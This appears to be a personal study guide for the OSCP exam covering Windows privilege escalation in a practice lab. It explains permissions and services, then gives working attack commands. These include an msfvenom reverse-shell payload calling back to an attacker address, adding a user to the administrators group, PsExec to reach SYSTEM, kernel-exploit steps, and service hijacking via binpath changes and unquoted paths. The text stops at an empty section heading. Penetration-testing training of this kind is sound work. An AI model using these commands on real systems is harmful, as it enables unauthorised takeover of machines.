# Windows Privilege Escalation Guide
I made this guide in preperation for my OSCP exam. It follows [this](https://www.udemy.com/course/windows-privilege-escalation/). The setup for the lab is [here](https://github.com/sagishahar/lpeworkshop).
This guide will contain more information than my Linux Privilege Escalation guide as Windows security is my weakest area.

A quick note:
```
# - Linux shell
> - cmd shell
ps1> - PowerShell... shell....
```
## Introduction
Our ultimate goal with privilege escalation in Windows is to gain access the the **Administrator** or **SYSTEM** account. 
All privilege escalation techniques are effectively examples of access control violations. Access control and user permissions are intrinsically linked.
We need to understand how Windows handles permissions.

### Understanding Permissions in Windows
User accounts are used to log into a Windows system. Think of a user account as a collection of settings / preferences bound to a unique identity.
The local "Administrator" account is created by default at installation. Several other default user accounts may exist (e.g. Guest) depending on the version of Windows.

Service accounts are (somewhat obviously) used to run services in Windows. Service accounts cannot be used to sign into a Windows system. The SYSTEM account is a default service account which has the highest privileges of any local account in Windows. 
Other default service accounts include NETWORK SERVICE and LOCAL SERVICE.

User accounts can belong to multiple groups, and groups can have multiple users. Groups allow for easier access control resources. Regular groups (e.g. Administrators, Users) have a set list of members.
Pseudo groups (e.g. "Authenticated Users") have a dynamic list of members which changes based on certain interactions.

In Windows, there are multiple types of resources (also known as objects):
- Files / Directories
- Registry Entries
- Services

Whether a user and/or group has permissions to perform a certain action on a resource depends on that resource's access control list (ACL).

Permissions to access a certain resource in Windows are controlled by the access control list (ACL) for that resource. Each ACL is made up of zero or more access control entries (ACEs).
Eache ACE defines the relationship between a principal (e.g. a user, group) and a certain access right.

## Spawning Administrator Shells

### msfvenom
If we can execute commands with admin privileges, a reverse shell generated by msfvenom works nicely:
```bash
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o reverse.exe
```

This reverse shell can be caught using netcat or Metasploit's own multi/handler.

### RDP
If RDP is available (or we can enable it), we can add our low privilege user to the administrators group and spawn an administrator command prompt via the GUI.
```cmd
> net localgroup administrators <username> /add
```

### Admin -> SYSTEM
To escalate from admin user to full SYSTEM privileges, you can use the PsExec tool from Windows Sysinternals. [Here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
```cmd
> .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
```

## Privilege Escalation Tools
Tools allow us to automate the reconnaissance that can identify potential privilege escalations. This course mainly uses winPEAS and Seatbelt. Check out WinEnum.

### PowerUp & SharpUp
Very similar tools that hunt for specific privilege escalation misconfigurations
[PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
[SharpUp](https://github.com/GhostPack/SharpUp)

To run PowerUp, start a PowerShell session and use dot sourcing to load the script:
```ps1
ps1> . .\PowerUp.ps1
```

Run the Invoke-AllChecks function to start checking for command Privilege escalation misconfigurations
```ps1
ps1> Invoke-AllChecks
```

To Run SharpUp, start a command prompt and run the executable:
```cmd
> .\SharpUp.exe
```

[Seatbelt](https://github.com/GhostPack/Seatbelt) is an enumeration tool. It contains a number of enumeration checks. It does not actively hunt for privilege escalation misconfigurations, but provides related information for further investigation.
Run all checks and filter out unimportant results:
```cmd
> .\Seatbelt.exe all
```

To run specific check(s):
```cmd
> .\Seatbelt.exe <check> <check> ...
```

### winPEAS
[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) very powerful tool that not only actively hunts for privilege escalation misconfigurations, but highlights them for the user in the results.

Before running, we need to add a registry key and then reopen the command prompt:
```cmd
> reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```
This adds colors to your command prompt.

Run all checks while avoiding time-consuming searches:
```cmd
> .\winPEASany.exe quiet cmd fast
```

Run specific check categories:
```cmd
> .\winPEASany.exe quiet cmd systeminfo
```

### accesschk.exe
Old but trustworthy tool for checking user access control rights. You can use it to check whether a user or grup has access to files, directories, services, and registry keys.
The downside is more recent versions of the program spawn a GUI "accept EULA" popup window. When using the command line, we have to use an older version which still has an /accepteula command line option.

## Kernel Exploits
The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the SYSTEM user. 

### Finding Kernel Exploits
Finding and using kernel exploits is usually a simple process:
1. Enumerate Windows version / patch level (systeminfo).
2. Find matching exploits (Google, ExploitDB, GitHub).
3. Compile and run

Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.
[Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
[Precompiled Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
[Watson](https://github.com/rasta-mouse/Watson)

### Privilege Escalation
1. Extract the output of the systeminfo command:
```cmd
> systeminfo > systeminfo.txt
```
2. Run wesng to find potential exploits:
```bash
# python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
```
3. Cross-reference results with [compiled exploits](https://github.com/SecWiki/windows-kernel-exploits)
4. Download the compiled exploit onto the Windows machine
5. Start a listener on Kali and run the exploit, providing it with the reverse shell executable, which should run with SYSTEM privileges:
```cmd
> .\x64.exe C:\PrivEsc\reverse.exe
```

## Service Exploits
Services are simply programs that run in the background, accepting input or performing regular tasks. 
If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well.

Query the configuration of a service (service command (sc.exe) query dependencies (qc)):
```cmd
> sc.exe qc <name>
```

Query the current status of a service:
```cmd
> sc.exe query <name>
```

Modify a configuration option of a service:
```cmd
> sc.exe config <name> <option>= <value>
```

Start/stop a service:
```cmd
> net start/stop <name>
```

These are the main AV for services:
1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permissions
4. Insecure Service Executables
5. DLL Hijacking

### Insecure Service Permissions
Each service has an ACL which defines certain service-specific permissions.
Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS).
Some may be useful (e.g. **SERVICE_STOP, SERVICE_START**).
Some dangerous (e.g. **SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS**).

If our user has permissions to change the configurations of a service which runs with SYSTEM privileges, we can change the executable the services uses to one of our own.

**Potential Rabbit Hole:** If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!
1. Run winPEAS to check for service misconfigurations
```cmd
> .\winPEASany.exe quiet servicesinfo
```
2. Note that we can modify the "daclsvc" service.
3. We can confirm this with accesschk.exe
```cmd
> .\accesschk.exe /accepteula -uwcqv user daclsvc
```
4. Check the current configuration of the service:
```cmd
> sc qc daclsvc
```
5. Check the current status of the service:
```cmd
> sc query daclsvc
```
6. Reconfigure the service to use our reverse shell executable:
```cmd
> sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
```
7. Start a listener on Kali, and then start the sercie to trigger the exploit
```cmd
> net start daclsvc
```

### Unquoted Service Path
Executables in Windows can be run without using their extensions (e.g. "whoami.exe" can be run by just typing "whoami").
Some executables take arguments, seperated by spaces (e.g. someprog.exe arg1 arg2 arg3...).
This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.

Consider the following unquoted path:
```
C:\Program Files\Some Dir\SomeProgram.exe
```
To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be the executable, with two arguments: "Files\Some" and "Dir\SomeProgram.exe".
Windows resolves this ambiguity by checking each of the possibilities in turn. 
If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.

1. Run winPEAS to check for service misconfigurations:
```cmd
> .\winPEASany.exe quiet servicesinfo
```
2. Note that the "unquotedsvc" service has an unquoted path that also contains spaces: C:\Program Files\Unquoted Path Service\Command Files\unquotedpathservice.exe
3. Confirm using sc:
```cmd
> sc qc unquotedsvc
```
4. Use accesschk.exe to check for write permissions:
```cmd
> .\accesschk.exe /accepteula -uwdq C:\
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```
5. Copy the reverse shell executable and rename it appropriately:
```cmd
> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe
```
6. Start a listener on Kali, and then start the service to trigger the exploit:
```cmd
> net start unquotedsvc
```

### Weak Registry Permissions
